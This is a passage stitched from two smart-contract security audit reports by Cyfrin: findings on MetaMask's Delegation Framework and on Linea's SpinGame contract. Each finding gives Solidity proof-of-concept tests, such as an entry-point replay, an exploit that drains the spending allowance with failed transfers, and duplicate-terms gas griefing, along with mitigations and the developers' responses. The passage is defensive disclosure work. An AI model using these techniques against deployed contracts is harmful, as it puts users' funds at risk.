        // 4. Verify if the attack succeeded - check if Bob received ETH again
        assertEq(users.bob.addr.balance, bobBalanceAfterExecution + 1 ether);

        console.log("Bob's initial balance was: %d", bobInitialBalance / 1 ether);
        console.log("Bob's balance after execution on old entry point was: %d", bobBalanceAfterExecution / 1 ether);
        console.log("Bob's balance after replaying user op on new entry point: %d", users.bob.addr.balance / 1 ether);
    }
}
```

**Recommended Mitigation:** Consider including `EntryPoint` address in the hashing logic of `getPackedUserOperationHash` of both `DeleGatorCore` and `EIP7702DeleGatorCore`

**Metamask:** Fixed in commit [1f91637](https://github.com/MetaMask/delegation-framework/commit/1f91637e7f61d03e012b7c9d7fc5ee4dc86ce3f3)

**Cyfrin:** Resolved. `EntryPoint` is now included in the hashing logic.

\clearpage
## Medium Risk


### Transfer Amount enforcer for ERC20 and Native transfers increase spend limit without checking actual transfers

**Description:** Failed token/native transfers can potentially deplete a delegation's spending allowance when used with the `EXECTYPE_TRY` execution mode.

The issue occurs because the enforcer tracks spending limits by incrementing a counter in its `beforeHook`, before the actual token transfer occurs. In the `EXECTYPE_TRY` mode, if the token transfer fails, the execution continues without reverting, but the limit is still increased.

```solidity
function _validateAndIncrease(
    bytes calldata _terms,
    bytes calldata _executionCallData,
    bytes32 _delegationHash
)
    internal
    returns (uint256 limit_, uint256 spent_)
{
    // ... validation code ...

    //@audit This line increases the spent amount BEFORE the actual transfer happens
    spent_ = spentMap[msg.sender][_delegationHash] += uint256(bytes32(callData_[36:68]));
    require(spent_ <= limit_, "ERC20TransferAmountEnforcer:allowance-exceeded");
}

```

This means a malicious delegate could repeatedly attempt transfers that are designed to fail, draining the allowance without actually transferring any tokens.

**Impact:** This vulnerability allows an attacker to potentially exhaust a delegator's entire token transfer allowance without actually transferring any tokens

**Proof of Concept:**
```solidity
function test_transferFailsButSpentLimitIncreases() public {
        // Create a delegation from Alice to Bob with spending limits
        Caveat[] memory caveats = new Caveat[](3);

        // Allowed Targets Enforcer - allow only the token
        caveats[0] = Caveat({ enforcer: address(allowedTargetsEnforcer), terms: abi.encodePacked(address(mockToken)), args: hex"" });

        // Allowed Methods Enforcer - allow only transfer
        caveats[1] =
            Caveat({ enforcer: address(allowedMethodsEnforcer), terms: abi.encodePacked(IERC20.transfer.selector), args: hex"" });

        // ERC20 Transfer Amount Enforcer - limit to TRANSFER_LIMIT tokens
        caveats[2] = Caveat({
            enforcer: address(transferAmountEnforcer),
            terms: abi.encodePacked(address(mockToken), uint256(TRANSFER_LIMIT)),
            args: hex""
        });

        Delegation memory delegation = Delegation({
            delegate: address(users.bob.deleGator),
            delegator: address(users.alice.deleGator),
            authority: ROOT_AUTHORITY,
            caveats: caveats,
            salt: 0,
            signature: hex""
        });

        // Sign the delegation
        delegation = signDelegation(users.alice, delegation);

        // First, verify the initial spent amount is 0
        bytes32 delegationHash = EncoderLib._getDelegationHash(delegation);
        uint256 initialSpent = transferAmountEnforcer.spentMap(address(delegationManager), delegationHash);
        assertEq(initialSpent, 0, "Initial spent should be 0");

        // Initial balances
        uint256 aliceInitialBalance = mockToken.balanceOf(address(users.alice.deleGator));
        uint256 bobInitialBalance = mockToken.balanceOf(address(users.bob.addr));
        console.log("Alice initial balance:", aliceInitialBalance / 1e18);
        console.log("Bob initial balance:", bobInitialBalance / 1e18);

        // Amount to transfer
        uint256 amountToTransfer = 500 ether;

        // Create the mode for try execution
        ModeCode tryExecuteMode = ModeLib.encode(CALLTYPE_SINGLE, EXECTYPE_TRY, MODE_DEFAULT, ModePayload.wrap(bytes22(0x00)));

        // First test successful transfer
        {
            // Make sure token transfers will succeed
            mockToken.setHaltTransfer(false);

            // Prepare transfer execution
            Execution memory execution = Execution({
                target: address(mockToken),
                value: 0,
                callData: abi.encodeWithSelector(
                    IERC20.transfer.selector,
                    address(users.bob.addr), // Transfer to Bob's EOA
                    amountToTransfer
                )
            });

            // Execute the delegation with try mode
            execute_UserOp(
                users.bob,
                abi.encodeWithSelector(
                    delegationManager.redeemDelegations.selector,
                    createPermissionContexts(delegation),
                    createModes(tryExecuteMode),
                    createExecutionCallDatas(execution)
                )
            );

            // Check balances after successful transfer
            uint256 aliceBalanceAfterSuccess = mockToken.balanceOf(address(users.alice.deleGator));
            uint256 bobBalanceAfterSuccess = mockToken.balanceOf(address(users.bob.addr));
            console.log("Alice balance after successful transfer:", aliceBalanceAfterSuccess / 1e18);
            console.log("Bob balance after successful transfer:", bobBalanceAfterSuccess / 1e18);

            // Check spent map was updated
            uint256 spentAfterSuccess = transferAmountEnforcer.spentMap(address(delegationManager), delegationHash);
            console.log("Spent amount after successful transfer:", spentAfterSuccess / 1e18);
            assertEq(spentAfterSuccess, amountToTransfer, "Spent amount should be updated after successful transfer");

            // Verify the transfer actually occurred
            assertEq(aliceBalanceAfterSuccess, aliceInitialBalance - amountToTransfer);
            assertEq(bobBalanceAfterSuccess, bobInitialBalance + amountToTransfer);
        }

        // Now test failing transfer
        {
            // Make token transfers fail
            mockToken.setHaltTransfer(true);

            // Prepare failing transfer execution
            Execution memory execution = Execution({
                target: address(mockToken),
                value: 0,
                callData: abi.encodeWithSelector(
                    IERC20.transfer.selector,
                    address(users.bob.addr), // Transfer to Bob's EOA
                    amountToTransfer
                )
            });

            // Execute the delegation with try mode
            execute_UserOp(
                users.bob,
                abi.encodeWithSelector(
                    delegationManager.redeemDelegations.selector,
                    createPermissionContexts(delegation),
                    createModes(tryExecuteMode),
                    createExecutionCallDatas(execution)
                )
            );

            // Check balances after failed transfer
            uint256 aliceBalanceAfterFailure = mockToken.balanceOf(address(users.alice.deleGator));
            uint256 bobBalanceAfterFailure = mockToken.balanceOf(address(users.bob.addr));
            console.log("Alice balance after failed transfer:", aliceBalanceAfterFailure / 1e18);
            console.log("Bob balance after failed transfer:", bobBalanceAfterFailure / 1e18);

            // Check spent map after failed transfer
            uint256 spentAfterFailure = transferAmountEnforcer.spentMap(address(delegationManager), delegationHash);
            console.log("Spent amount after failed transfer:", spentAfterFailure / 1e18);

            // THE KEY TEST: The spent amount increased even though the transfer failed!
            assertEq(spentAfterFailure, amountToTransfer * 2, "Spent amount should increase even with failed transfer");

            // Verify tokens weren't actually transferred
            assertEq(aliceBalanceAfterFailure, aliceInitialBalance - amountToTransfer);
            assertEq(bobBalanceAfterFailure, bobInitialBalance + amountToTransfer);
        }
    }
```

**Recommended Mitigation:** Consider one of the following options:
1. Implement a post check in afterHook() with following steps
    - track the initial balance in beforeHook
    - track the actual balance in afterHook
    - only update spend limit based on actual - initial -> in the afterHook

2. Alternatively, enforce `TransferAmountEnforcers` to be of execution type `EXECTYPE_DEFAULT` only,

**Metamask:** Fixed in commit [cdd39c6](https://github.com/MetaMask/delegation-framework/commit/cdd39c62d65436da0d97bff53a7a5714a3505453)

**Cyfrin:** Resolved. Restricted execution type to only `EXECTYPE_DEFAULT`


### Gas griefing via duplicate entries in `Allowed` class of enforcers

**Description:** Multiple enforcer contracts (`AllowedMethodsEnforcer` and `AllowedTargetsEnforcer`) don't validate the uniqueness of entries in their terms data, allowing malicious users to intentionally create delegations with excessive duplicates, dramatically increasing gas costs during validation.

`AllowedMethodsEnforcer`: Allows duplicate method selectors (4 bytes each)
`AllowedTargetsEnforcer`: Allows duplicate target addresses (20 bytes each)

None of these contracts prevent or detect duplicates in their terms data. This allows an attacker to artificially inflate gas costs by including the same entries multiple times, resulting in expensive linear search operations during validation.


```solidity
function getTermsInfo(bytes calldata _terms) public pure returns (bytes4[] memory allowedMethods_) {
    uint256 j = 0;
    uint256 termsLength_ = _terms.length;
    require(termsLength_ % 4 == 0, "AllowedMethodsEnforcer:invalid-terms-length");
    allowedMethods_ = new bytes4[](termsLength_ / 4);
    for (uint256 i = 0; i < termsLength_; i += 4) {
        allowedMethods_[j] = bytes4(_terms[i:i + 4]);
        j++;
    }
}

// In beforeHook:
for (uint256 i = 0; i < allowedSignaturesLength_; ++i) {
    if (targetSig_ == allowedSignatures_[i]) { //@audit linear search can be expensive
        return;
    }
}
```

**Impact:** As demonstrated in the test case for `AllowedMethodsEnforcer`, including 100 duplicate method signatures increases gas consumption from 50,881 to 155,417 (a difference of 104,536 gas). This represents a ~3x increase in gas consumption with just 100 duplicates. A malicious actor can use this to make execution expensive for a delegator.

**Proof of Concept:** Run the following test

```solidity
 function test_AllowedMethods_DuplicateMethodsGriefing() public {
        // Create terms with a high number of duplicated methods to increase gas costs
        bytes memory terms = createDuplicateMethodsTerms(INCREMENT_SELECTOR, 100);

        // Create execution to increment counter
        Execution memory execution =
            Execution({ target: address(aliceCounter), value: 0, callData: abi.encodeWithSelector(INCREMENT_SELECTOR) });

        // Create delegation with allowed methods caveat
        Caveat[] memory caveats = new Caveat[](1);
        caveats[0] = Caveat({ enforcer: address(allowedMethodsEnforcer), terms: terms, args: "" });

        // Create and sign the delegation
        Delegation memory delegation = Delegation({
            delegate: address(users.bob.deleGator),
            delegator: address(users.alice.deleGator),
            authority: ROOT_AUTHORITY,
            caveats: caveats,
            salt: 0,
            signature: hex""
        });

        delegation = signDelegation(users.alice, delegation);

        // Measure gas usage with many duplicate methods
        Delegation[] memory delegations = new Delegation[](1);
        delegations[0] = delegation;

        uint256 gasUsed = uint256(
            bytes32(
                gasReporter.measureGas(
                    address(users.bob.deleGator),
                    address(delegationManager),
                    abi.encodeWithSelector(
                        delegationManager.redeemDelegations.selector,
                        createPermissionContexts(delegation),
                        createModes(),
                        createExecutionCallDatas(execution)
                    )
                )
            )
        );

        console.log("Gas used with 100 duplicate methods:", gasUsed);

        // Now compare to normal case with just one method
        terms = abi.encodePacked(INCREMENT_SELECTOR);
        caveats[0].terms = terms;

        delegation.caveats = caveats;
        delegation = signDelegation(users.alice, delegation);

        delegations[0] = delegation;

        uint256 gasUsedNormal = uint256(
            bytes32(
                gasReporter.measureGas(
                    address(users.bob.deleGator),
                    address(delegationManager),
                    abi.encodeWithSelector(
                        delegationManager.redeemDelegations.selector,
                        createPermissionContexts(delegation),
                        createModes(),
                        createExecutionCallDatas(execution)
                    )
                )
            )
        );

        console.log("Gas used with 1 method:", gasUsedNormal);
        console.log("Gas diff:", gasUsed - gasUsedNormal);

        assertGt(gasUsed, gasUsedNormal, "Griefing with duplicate methods should use more gas");
    }

    function createDuplicateMethodsTerms(bytes4 selector, uint256 count) internal pure returns (bytes memory) {
        bytes memory terms = new bytes(count * 4);
        for (uint256 i = 0; i < count; i++) {
            bytes4 methodSig = selector;
            for (uint256 j = 0; j < 4; j++) {
                terms[i * 4 + j] = methodSig[j];
            }
        }
        return terms;
    }

    function createPermissionContexts(Delegation memory del) internal pure returns (bytes[] memory) {
        Delegation[] memory delegations = new Delegation[](1);
        delegations[0] = del;

        bytes[] memory permissionContexts = new bytes[](1);
        permissionContexts[0] = abi.encode(delegations);

        return permissionContexts;
    }

    function createExecutionCallDatas(Execution memory execution) internal pure returns (bytes[] memory) {
        bytes[] memory executionCallDatas = new bytes[](1);
        executionCallDatas[0] = ExecutionLib.encodeSingle(execution.target, execution.value, execution.callData);
        return executionCallDatas;
    }

    function createModes() internal view returns (ModeCode[] memory) {
        ModeCode[] memory modes = new ModeCode[](1);
        modes[0] = mode;
        return modes;
    }
```
**Recommended Mitigation:** Consider enforcing that entries in terms are strictly increasing, which naturally prevents duplicates. A validation as shown below will prevent duplicates in this case. Also, consider implementing a binary search on a sorted array viz-a-viz linear search.

```solidity
function getTermsInfo(bytes calldata _terms) public pure returns (bytes4[] memory allowedMethods_) {
    uint256 termsLength_ = _terms.length;
    require(termsLength_ % 4 == 0, "AllowedMethodsEnforcer:invalid-terms-length");
    allowedMethods_ = new bytes4[](termsLength_ / 4);

    bytes4 previousSelector = bytes4(0);

    for (uint256 i = 0; i < termsLength_; i += 4) {
        bytes4 currentSelector = bytes4(_terms[i:i + 4]);

        // Ensure selectors are strictly increasing (prevents duplicates)
        require(uint32(currentSelector) > uint32(previousSelector),
                "AllowedMethodsEnforcer:selectors-must-be-strictly-increasing"); //@audit prevents duplicates

        allowedMethods_[i/4] = currentSelector;
        previousSelector = currentSelector;
    }
}
```

**Metamask:** Acknowledged. It is the responsibility of the redeemer to see the terms are setup in such a way to prevent griefing attacks.

**Cyfrin:** Acknowledged.

\clearpage
## Low Risk


### `EIP7702StatelessDeleGator` violates `EIP4337` signature validation standards

**Description:** The `EIP7702StatelessDeleGator` implementation doesn't properly adhere to the EIP4337 standard regarding signature validation behavior.

According to EIP4337, the `validateUserOp` method should:

1. Return SIG_VALIDATION_FAILED (without reverting) only for signature mismatch cases
2. Revert for any other errors (including invalid signature format, incorrect length)

The current implementation in `EIP7702StatelessDeleGator._isValidSignature()` returns `SIG_VALIDATION_FAILED` for both signature mismatches and invalid signature length, which violates the specification:

```solidity
// EIP7702StatelessDeleGator.sol
    function _isValidSignature(bytes32 _hash, bytes calldata _signature) internal view override returns (bytes4) {
>>      if (_signature.length != SIGNATURE_LENGTH) return ERC1271Lib.SIG_VALIDATION_FAILED;

        if (ECDSA.recover(_hash, _signature) == address(this)) return ERC1271Lib.EIP1271_MAGIC_VALUE;

        return ERC1271Lib.SIG_VALIDATION_FAILED;
    }
```

This implementation is used by the `EntryPoint` when validating `UserOperations`, and incorrect handling can lead to inconsistencies with other EIP4337-compliant wallets.

**Impact:** Creates potential inconsistency with other EIP4337-compliant wallets

**Recommended Mitigation:** Consider removing the signature length check in `EIP7702StatelessDeleGator._isValidSignature()`. This will cause the function to rely on OpenZeppelin's `ECDSA.recover()` function to revert for invalid signature formats, consistent with the EIP4337 specification.

**Metamask**
Fixed in [b52cf04](https://github.com/MetaMask/delegation-framework/commit/b52cf041f5a41914d9014d777da9a3db17080fa6).

**Cyfrin**
Resolved.


### `AllowedCalldataEnforcer` cannot authenticate empty calldata preventing `receive()` function calls

**Description:** The `AllowedCalldataEnforcer` contract has a design flaw that prevents it from authenticating calls with empty calldata. This issue arises from a requirement check in the `getTermsInfo` function that enforces `_terms.length >= 33`:

```solidity
// AllowedCalldataEnforcer.sol
    function getTermsInfo(bytes calldata _terms) public pure returns (uint256 dataStart_, bytes memory value_) {
>>      require(_terms.length >= 33, "AllowedCalldataEnforcer:invalid-terms-size");
        dataStart_ = uint256(bytes32(_terms[0:32]));
        value_ = _terms[32:];
    }
```

The first 32 bytes represent the starting offset in the calldata, and anything after that represents the expected value to match against. This design requires at least 1 byte for the value, which prevents the enforcer from handling empty calldata scenarios.

Ethereum contracts can receive ETH through functions with empty calldata, specifically:
- When calling a contract's `receive()` function, which requires empty calldata
- When making simple ETH transfers to contracts that implement `receive()`

**Impact:** Users cannot use `AllowedCalldataEnforcer` to authorize delegations that should only permit simple ETH transfers to contracts with receive(). Common use cases like depositing ETH to WETH (which uses the receive() function) cannot be properly enforced through this caveat


**Recommended Mitigation:** Consider modifying the `getTermsInfo` function to allow terms of exactly 32 bytes length, treating it as a special case where the value is empty:

```solidity
function getTermsInfo(bytes calldata _terms) public pure returns (uint256 dataStart_, bytes memory value_) {
    require(_terms.length >= 32, "AllowedCalldataEnforcer:invalid-terms-size");
    dataStart_ = uint256(bytes32(_terms[0:32]));
    if (_terms.length == 32) {
        value_ = new bytes(0); // @audit Empty bytes for empty calldata
    } else {
        value_ = _terms[32:];
    }
}
```

**Metamask:** Addressed in commit [db11bf7](https://github.com/MetaMask/delegation-framework/commit/db11bf74034a94bddaae189299cb757fd03cadeb).

**Cyfrin:** Resolved. Added a new caveat `ExactCalldataEnforcer` to address the issue.


### NFT safe transfers will revert using `ERC721TransferEnforcer`

**Description:** The `ERC721TransferEnforcer` enforcer is designed to authorize NFT token transfers, but it currently restricts transfers to only use the `transferFrom` selector. The issue lies in this code section:

```solidity
//ERC721TransferEnforcer.sol
bytes4 selector_ = bytes4(callData_[0:4]);

if (target_ != permittedContract_) {
    revert("ERC721TransferEnforcer:unauthorized-contract-target");
} else if (selector_ != IERC721.transferFrom.selector) {
    revert("ERC721TransferEnforcer:unauthorized-selector");
} else if (transferTokenId_ != permittedTokenId_) {
    revert("ERC721TransferEnforcer:unauthorized-token-id");
}
```

The ERC721 standard includes multiple transfer methods:

`transferFrom(address from, address to, uint256 tokenId)`
`safeTransferFrom(address from, address to, uint256 tokenId)`
`safeTransferFrom(address from, address to, uint256 tokenId, bytes data)`

The enforcer currently only supports the `transferFrom` method, which doesn't perform receiver capability checks. The `safeTransferFrom` methods are crucial for safely transferring NFTs to contracts, as they check whether the receiving contract supports the ERC721 standard through the onERC721Received callback.


**Impact:** Users are unable to utilize safer NFT transfer methods when using this enforcer.


**Recommended Mitigation:** Consider modifying the `ERC721TransferEnforcer` to accept all valid ERC721 transfer selectors.

**Metamask:** Fixed in [1a0ff2d](https://github.com/MetaMask/delegation-framework/commit/1a0ff2d92162f61945154d0a56a52b5878a2c9d0).

**Cyfrin:** Resolved.


### Parameter mismatch in `IdEnforcer::beforeHook()` event emission

**Description:** There's a parameter ordering mismatch in the IdEnforcer contract when emitting the `UsedId` event in the `beforeHook()` function. The event declaration and the actual emission use different parameter orders for the delegator and redeemer arguments.

The event is declared with parameters in this order:

```solidity
//IdEnforcer.sol
    event UsedId(address indexed sender, address indexed delegator, address indexed redeemer, uint256 id);
// ---------
    function beforeHook( ... ) ... {
        ...
>>      emit UsedId(msg.sender, _redeemer, _delegator, id_);
    }
```

**Impact:** Incorrect event data indexing.

**Recommended Mitigation:** Consider swapping the positions of `_redeemer` and `_delegator` in the event emission to align with the event declaration.

**Metamask:** Fixed in [5f8bea9](https://github.com/MetaMask/delegation-framework/commit/5f8bea93ea2f16b48104c901c69df504355546bd)

**Cyfrin:** Resolved.


### Inconsistent timestamp range validation in `TimestampEnforcer`

**Description:** The `TimestampEnforcer` contract allows the creation of delegations with a time-based validity window. However, it lacks validation to ensure logical consistency of the time range.

Specifically, when both the "after" and "before" thresholds are specified, there is no check to ensure that `timestampBeforeThreshold_` is greater than `timestampAfterThreshold_`.

```solidity
//TimeStampEnforcer.sol

function getTermsInfo(bytes calldata _terms)
    public
    pure
    returns (uint128 timestampAfterThreshold_, uint128 timestampBeforeThreshold_)
{
    require(_terms.length == 32, "TimestampEnforcer:invalid-terms-length");
    timestampBeforeThreshold_ = uint128(bytes16(_terms[16:]));
    timestampAfterThreshold_ = uint128(bytes16(_terms[:16]));
}
```

When both timestamps are non-zero, there is an independent check as follows

```solidity
//TimeStampEnforcer.sol

require(block.timestamp > timestampAfterThreshold_, "TimestampEnforcer:early-delegation");
require(block.timestamp < timestampBeforeThreshold_, "TimestampEnforcer:expired-delegation");
//@audit no check on validity of the range
```
This creates a potential for inconsistent time ranges where the "after" threshold is greater than the "before" threshold, resulting in a permanently unusable delegation.

**Impact:** Delegations can be created that appear valid but can never be exercised because of impossible time constraints.

**Recommended Mitigation:** Consider adding a validation check in the `getTermsInfo` function to ensure that when both timestamp thresholds are non-zero, the "before" threshold is greater than the "after" threshold.

**Metamask:** Acknowledged. It is on the delegator to create the correct terms for the delegation.

**Cyfrin:** Acknowledged.

\clearpage
## Informational


### DelegationManager is incompatible with smart contract wallets with Approved hashes

**Description:** In the `DelegationManager` contract, there is a limitation that affects smart contract wallets that implement pre-approved hashes functionality, such as Safe (formerly Gnosis Safe) wallets. The current implementation rejects delegations with empty signatures for both EOA and smart contract wallets.

```solidity
// DelegationManager.sol
    function redeemDelegations( ... ) ... {
        ...
        for (uint256 batchIndex_; batchIndex_ < batchSize_; ++batchIndex_) {
            ...
            if (delegations_.length == 0) { ... } else {
                ...
                for (uint256 delegationsIndex_; delegationsIndex_ < delegations_.length; ++delegationsIndex_) {
                    ...
>>                  if (delegation_.signature.length == 0) {
                        // Ensure that delegations without signatures revert
                        revert EmptySignature();
                    }

                    if (delegation_.delegator.code.length == 0) {
                        // Validate delegation if it's an EOA
                        ...
                    } else {
                        // Validate delegation if it's a contract
                        ...
>>                      bytes32 result_ = IERC1271(delegation_.delegator).isValidSignature(typedDataHash_, delegation_.signature);
                        ...
                    }
                }
```

This presents a compatibility issue with Safe wallets and similar smart contract wallets that use a pattern where empty signatures trigger checking for pre-approved hashes. In Safe's implementation:

[SignatureVerifierMuxer.sol#L163-L165](https://github.com/safe-global/safe-smart-account/blob/main/contracts/handler/extensible/SignatureVerifierMuxer.sol#L163-L165)
```solidity
    function isValidSignature(bytes32 _hash, bytes calldata signature) external view override returns (bytes4 magic) {
        (ISafe safe, address sender) = _getContext();

        // Check if the signature is for an `ISafeSignatureVerifier` and if it is valid for the domain.
        if (signature.length >= 4) {
            ...

            // Guard against short signatures that would cause abi.decode to revert.
            if (sigSelector == SAFE_SIGNATURE_MAGIC_VALUE && signature.length >= 68) { ... }
        }

        // domainVerifier doesn't exist or the signature is invalid for the domain - fall back to the default
>>      return defaultIsValidSignature(safe, _hash, signature);
    }
// -----------------
    function defaultIsValidSignature(ISafe safe, bytes32 _hash, bytes memory signature) internal view returns (bytes4 magic) {
        bytes memory messageData = EIP712.encodeMessageData( ... );
        bytes32 messageHash = keccak256(messageData);
>>      if (signature.length == 0) {
            // approved hashes
>>          require(safe.signedMessages(messageHash) != 0, "Hash not approved");
        } else {
            // threshold signatures
            safe.checkSignatures(address(0), messageHash, signature);
        }
        magic = ERC1271.isValidSignature.selector;
    }
```

Since DelegationManager rejects empty signatures before calling `isValidSignature`, it prevents Safe wallets from using their pre-approved hash mechanism for delegations.

**Impact:** This limitation prevents Safe wallets and similar smart contract wallets from using their gas-efficient pre-approved hash mechanism with delegations.

**Recommended Mitigation:** To enable compatibility with Safe wallets' pre-approved hash mechanism, consider applying the empty signature check only to EOAs. Alternatively, consider documenting that Safe wallets pre-approved hashes are not supported in the current delegation framework.

**Metamask:** Fixed in commit [155d20c](https://github.com/MetaMask/delegation-framework/commit/155d20c8bf173d556ef738ec808b3583da1a7c9d).

**Cyfrin:** Resolved.


### `NotSelf()` error declaration is unused

**Description:** The `DeleGatorCore` contract and `EIP7702DeleGatorCore` contract both define a custom error called `NotSelf()`, but this error is never actually thrown anywhere in either contract or their derived implementations.

```solidity
   // DeleGatorCore and EIP7702DeleGatorcore
    /// @dev Error thrown when the caller is not this contract.
    error NotSelf();
```

**Recommended Mitigation:** Consider removing the error from these two contracts

**Metamask:** Acknowledged. Will keep this incase inheriting implementations wish to leverage in the future.

**Cyfrin:** Acknowledged.


### Missing zero length check in `AllowedMethodsEnforcer::getTermsInfo()`

**Description:** The `AllowedMethodsEnforcer` contract's `getTermsInfo()` function correctly validates that the provided terms length is divisible by 4 (as each method selector is 4 bytes), but it fails to reject empty terms (length == 0). Empty terms would technically pass the modulo check since `0 % 4 == 0`, but would result in an empty array of allowed methods.

**Impact:** A delegation with empty terms would never allow any method to be called, as the enforcer would iterate through an empty array of allowed methods and then revert with "AllowedMethodsEnforcer:method-not-allowed" instead of properly rejecting the invalid terms with "AllowedMethodsEnforcer:invalid-terms-length"

**Recommended Mitigation:** Consider adding a specific check to ensure the terms length is greater than zero.

**Metamask:** Fixed in commit [cb2d4d7](https://github.com/MetaMask/delegation-framework/commit/cb2d4d77a66643e541141b3c8291df52340d60ce).

**Cyfrin:** Resolved.



### Insufficient delegate address validation in `NativeTokenPaymentEnforcer`

**Description:** The `NativeTokenPaymentEnforcer` contract's `afterAllHook()` function calls `delegationManager.redeemDelegations()` to process a payment using an allowance delegation. However, it doesn't properly validate that the delegate address in the allowance delegation is either the enforcer contract itself (`address(this)`) or the special `ANY_DELEGATE` address.

```solidity
   // NativeTokenPaymentEnforcer.sol
    function afterAllHook( ... ) ... {
        ...
        Delegation[] memory allowanceDelegations_ = abi.decode(_args, (Delegation[]));

        ...
        // Attempt to redeem the delegation and make the payment
>>      delegationManager.redeemDelegations(permissionContexts_, encodedModes_, executionCallDatas_);

        ...
    }
```

This validation is important because the delegation will only be successfully redeemed if the caller is the specified delegate or if the delegate is set to `ANY_DELEGATE`. Without this check, the payment process might fail unexpectedly when the caller (the `NativeTokenPaymentEnforcer` contract) isn't authorized as the delegate.

**Impact:** Payment transactions may revert unexpectedly

**Recommended Mitigation:** Consider adding a check to ensure that the delegate address in the allowance delegation is either `address(this)` or the special `ANY_DELEGATE` address

**Metamask:** Acknowledged. Will revert in the `DelegationManager`.

**Cyfrin:** Acknowledged.

\clearpage
## Gas Optimization


### `WebAuthn::contains()` optimization

**Description:** In the `WebAuthn::contains()` function, the current implementation checks for out-of-bounds conditions inside the loop on each iteration. This is inefficient as the same check is performed repeatedly.

```solidity
//WebAuthn.sol
function contains(string memory substr, string memory str, uint256 location) internal pure returns (bool) {
    bytes memory substrBytes = bytes(substr);
    bytes memory strBytes = bytes(str);

    uint256 substrLen = substrBytes.length;
    uint256 strLen = strBytes.length;

    for (uint256 i = 0; i < substrLen; i++) {
        if (location + i >= strLen) {
            return false;
        }
        ...
    }

    return true;
}
```

**Recommended Mitigation:** Consider performinga single bounds check before entering the loop. This checks if the substring would fit within the main string at the specified location.

**Metamask:** Acknowledged. Taken from SmoothCyptoLib - will keep this for consistency.

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2025-03-18-cyfrin-Metamask-DelegationFramework1-v2.0.md ------


------ FILE START car/reports_md/2025-03-19-cyfrin-linea-spingame-v2.0.md ------

**Lead Auditors**

[Immeas](https://twitter.com/0ximmeas)

[Farouk](https://twitter.com/Ubermensh3dot0)

**Assisting Auditors**

[Alex Roan](https://twitter.com/alexroan)

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

---

# Findings
## Medium Risk


### Native token prizes cannot be funded due to missing `receive()` function

**Description:** SpinGame supports multiple prize types, including ERC721, ERC20, and native tokens, where native tokens are represented as `prize.tokenAddress = address(0)`.

To ensure that prizes can be successfully claimed, the protocol team is responsible for maintaining a sufficient token balance in the contract by transferring the necessary assets to the Spin contract.

However, there is an issue specifically with native token prizes: the Spin contract does not have a `receive()` or `fallback()` function, and none of its functions are `payable`. This means there is no way for the team to fund the contract with native tokens using a standard transfer, preventing users from successfully claiming native token prizes.

**Impact:** Native token prizes cannot be claimed because there is no mechanism to deposit native tokens into the contract. The only way to provide a native token balance would involve esoteric workarounds, such as self-destructing a contract that sends funds to the Spin contract.


**Proof of Concept:** Add the following test to `Spin.t.sol`:
```solidity
function testTransferNativeToken() public {
    vm.deal(admin,1e18);

    vm.prank(admin);
    (bool success, ) = address(spinGame).call{value: 1e18}("");

    // transfer failed as there is no `receive` or `fallback` function
    assertFalse(success);
}
```

**Recommended Mitigation:** Consider adding a `receive()` function to the contract to allow native token deposits:

```solidity
receive() external payable {}
```

**Linea:** Fixed in commit [`d1ab4bd`](https://github.com/Consensys/linea-hub/commit/d1ab4bdbaac3639a36d66440b9e6da95771e4b34)

**Cyfrin:** Verified.

\clearpage
## Low Risk


### Rounding errors in boosted probability calculation can cause guaranteed wins to fail

**Description:** The Linea SpinGame includes a boosting feature that allows the protocol to increase a specific user's chance of winning. However, this mechanism introduces the possibility of a user's total winning probability exceeding 100%, as the boosted probabilities can sum to a value greater than 100%. To address this, the contract normalizes the total boosted probability in [`Spin::_fulfillRandomness`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L538-L557):

```solidity
// Apply boost on the sum of totalProbabilities.
uint256 boostedTotalProbabilities = totalProbabilities * userBoost / BASE_POINT;

// If boostedTotalProbabilities exceeds 100% we have to increase the winning threshold so it stays in bound.
//
// Example:
//   PrizeA probability: 50%
//   PrizeB probability: 30%
//   User boost: 1.5x
//   boostedPrizeAProbability: 75%
//   boostedPrizeBProbability: 45%
//
//   We now have a total of 120% totalBoostedProbability so we need to increase winning threshold by boostedTotalProbabilities to BASE_POINT ratio.
//
//   winningThreshold = winningThreshold * 12_000 / 10_000
if (boostedTotalProbabilities > BASE_POINT) {
    winningThreshold =
        (winningThreshold * boostedTotalProbabilities) /
        BASE_POINT;
}
```

Later in [`Spin::_fulfillRandomness`](https://github.com/Consensys/linea-hub/blob/295344925ec4321265f7cbac174fcf903b529a4e/contracts/src/Spin.sol#L569-L589), each prize probability is independently scaled when checking if the user has won:

```solidity
// Apply boost on a single prize probability.
uint256 boostedPrizeProbability = prizeProbability * userBoost / BASE_POINT;

unchecked {
    cumulativeProbability += boostedPrizeProbability;
}

if (winningThreshold < cumulativeProbability) {
    selectedPrizeId = localPrizeIds[i];

    // ... win
    break;
}
```

The issue arises from the probability calculation:

```solidity
uint256 boostedPrizeProbability = prize.probability +
    ((prize.probability * userBoost) / BASE_POINT);
```

Due to this calculation, the final `cumulativeProbability` can be lower than `boostedTotalProbabilities`, leading to a scenario where a user who should be guaranteed a win might still lose due to rounding errors.

**Impact:** A user who theoretically has a 100% chance of winning can still lose. While this is an unlikely edge case, it would be highly problematic for the unlucky user who, despite the math suggesting they are guaranteed a win, does not receive a prize due to numerical precision issues.

**Proof of Concept:** Consider the following example:

- There are three prizes, each with a 30% probability of being won.
- A user receives a 133% probability boost.

Calculating the boosted probabilities:

```solidity
boostedTotalProbabilities = 0.9e8*133_333_333/1e8 = 119_999_999
boostedPrizeProbability = 0.3e8*133_333_333/1e8 = 39_999_999
```
and
```
3*39_999_999 = 119_999_997
```

In the worst case, the user could get:

```
winningThreshold = 99_999_999
```

Applying the threshold adjustment:

```solidity
if (boostedTotalProbabilities > BASE_POINT) {
    winningThreshold =
        (winningThreshold * boostedTotalProbabilities) /
        BASE_POINT;
}
```

This results in:

```
winningThreshold = 99_999_999 * 119_999_999 / 1e8 = 119_999_997
```

Since `winningThreshold < cumulativeProbability` is the condition for winning, and:

```
119_999_997 < 119_999_997  // (false)
```

The condition fails, meaning the user loses, even though they were supposed to be guaranteed a win. This issue is caused by the rounding errors in scaling probabilities.


**Recommended Mitigation:** Consider ensuring that in the last iteration of the loop, if `boostedTotalProbabilities >= BASE_POINT`, the user is guaranteed a win:

```diff
- if (winningThreshold < cumulativeProbability) {
